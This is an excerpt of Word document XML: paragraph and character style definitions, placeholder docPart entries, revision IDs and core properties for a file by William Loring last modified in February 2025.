  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:rsid w:val="00CD7F5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D7F55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CD7F55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CD7F55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CD7F55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D7F55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D7F55"/>
    <w:pPr>
      <w:spacing w:after="100" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="403"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00826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2805"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Red">
    <w:name w:val="Red"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00922805"/>
    <w:rPr>
      <w:color w:val="FF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45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F4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2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ulnweb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12680978DF54D4A925FC91912753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570DF-E6C1-4B3D-B6CD-5FEE18AB7E80}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00171195" w:rsidRDefault="00BF4911" w:rsidP="00BF4911">
          <w:pPr>
            <w:pStyle w:val="D12680978DF54D4A925FC9191275312C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13CA42F31A3E4BD58E9F5E1778FF7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8231-AE62-4672-83EE-C8C1DB5D4387}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="001D173C" w:rsidRDefault="0006568A" w:rsidP="0006568A">
          <w:pPr>
            <w:pStyle w:val="13CA42F31A3E4BD58E9F5E1778FF758A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5504F915E218435EAF25D2A9D3249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752CA-4378-479B-B126-0DBC12620BEC}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="001D173C" w:rsidRDefault="0006568A" w:rsidP="0006568A">
          <w:pPr>
            <w:pStyle w:val="5504F915E218435EAF25D2A9D3249091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0E067DCF98194C3D8ED7D0F7F3A9E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03F6B-B822-42A7-AC1E-4FCB2EFB63EC}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00FD3AA0" w:rsidRDefault="00F47EFD" w:rsidP="00F47EFD">
          <w:pPr>
            <w:pStyle w:val="0E067DCF98194C3D8ED7D0F7F3A9EFD1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20F92C224FE94632BCBF2BF50AD00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5C6FB-6783-419B-A486-6A6C4DBF06D4}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="003A178B" w:rsidRDefault="00C416DA" w:rsidP="00C416DA">
          <w:pPr>
            <w:pStyle w:val="20F92C224FE94632BCBF2BF50AD00750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49"/>
    <w:rsid w:val="0006568A"/>
    <w:rsid w:val="000A10FC"/>
    <w:rsid w:val="00150DFE"/>
    <w:rsid w:val="00171195"/>
    <w:rsid w:val="001B274F"/>
    <w:rsid w:val="001D173C"/>
    <w:rsid w:val="003A178B"/>
    <w:rsid w:val="004C17B1"/>
    <w:rsid w:val="00775E7E"/>
    <w:rsid w:val="00A1734E"/>
    <w:rsid w:val="00BF4911"/>
    <w:rsid w:val="00C416DA"/>
    <w:rsid w:val="00DB1B74"/>
    <w:rsid w:val="00F32149"/>
    <w:rsid w:val="00F47EFD"/>
    <w:rsid w:val="00F91ECC"/>
    <w:rsid w:val="00FD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16DA"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="D12680978DF54D4A925FC9191275312C">
    <w:name w:val="D12680978DF54D4A925FC9191275312C"/>
    <w:rsid w:val="00BF4911"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="13CA42F31A3E4BD58E9F5E1778FF758A">
    <w:name w:val="13CA42F31A3E4BD58E9F5E1778FF758A"/>
    <w:rsid w:val="0006568A"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="5504F915E218435EAF25D2A9D3249091">
    <w:name w:val="5504F915E218435EAF25D2A9D3249091"/>
    <w:rsid w:val="0006568A"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="0E067DCF98194C3D8ED7D0F7F3A9EFD1">
    <w:name w:val="0E067DCF98194C3D8ED7D0F7F3A9EFD1"/>
    <w:rsid w:val="00F47EFD"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="20F92C224FE94632BCBF2BF50AD00750">
    <w:name w:val="20F92C224FE94632BCBF2BF50AD00750"/>
    <w:rsid w:val="00C416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F8E41-17D6-4AD8-A87C-E6AF9E207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502</TotalTime>
  <Pages>6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A. Loring</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>William Loring</cp:lastModifiedBy>
  <cp:revision>395</cp:revision>
  <cp:lastPrinted>2025-02-21T00:11:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-07-18T22:03:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-02-21T00:12:00Z</dcterms:modified>
</cp:coreProperties>
</file>